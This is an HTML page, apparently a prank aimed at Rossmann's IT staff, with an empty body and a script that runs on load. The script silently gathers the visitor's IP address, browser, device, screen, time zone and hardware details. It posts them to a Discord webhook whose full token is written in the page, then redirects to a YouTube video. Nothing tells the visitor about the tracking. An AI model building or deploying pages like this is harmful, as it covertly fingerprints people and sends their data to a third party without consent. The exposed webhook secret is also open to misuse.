<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8" />
<title>Pozdrawiam dział IT Rossmanna :)</title>
<script>
window.onload = async function() {
  const visited = document.cookie.split('; ').find(row => row.startsWith('visited='));
  const firstVisit = !visited;

  if (firstVisit) {
    document.cookie = "visited=true; max-age=" + 60*60*24*365 + "; path=/";
  }

  let ip = "Nieznany";
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    ip = data.ip;
  } catch(e) {
    ip = "Nie udało się pobrać IP";
  }

  const deviceInfo = navigator.userAgent;
  const language = navigator.language || "Nieznany";
  const platform = navigator.platform || "Nieznany";
  const screenResolution = `${screen.width}x${screen.height}`;
  const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Nieznana";
  const cpuCores = navigator.hardwareConcurrency || "Nieznana";
  const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Nieznana";
  const cookiesEnabled = navigator.cookieEnabled;

  const time = new Date().toLocaleString('pl-PL');

  const message = `
Strona została odwiedzona
Czas: ${time}
IP: ${ip}
Pierwsza wizyta: ${firstVisit ? "Tak" : "Nie"}
Urządzenie (userAgent): ${deviceInfo}
Język przeglądarki: ${language}
Platforma: ${platform}
Rozdzielczość ekranu: ${screenResolution}
Strefa czasowa: ${timeZone}
Liczba rdzeni CPU: ${cpuCores}
Pamięć RAM: ${ram}
Cookies włączone: ${cookiesEnabled}
`;

  fetch("https://discord.com/api/webhooks/1389658289888952321/0gV4TIXqbzokUK0ip19HE-HFLIfm4VpU6oDATHq7zTjJ3-ycC-faT3QU9xbFVvb6D4mB", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: message })
  })
  .finally(() => {
    window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0";
  });
};
</script>
</head>
<body>
</body>
</html>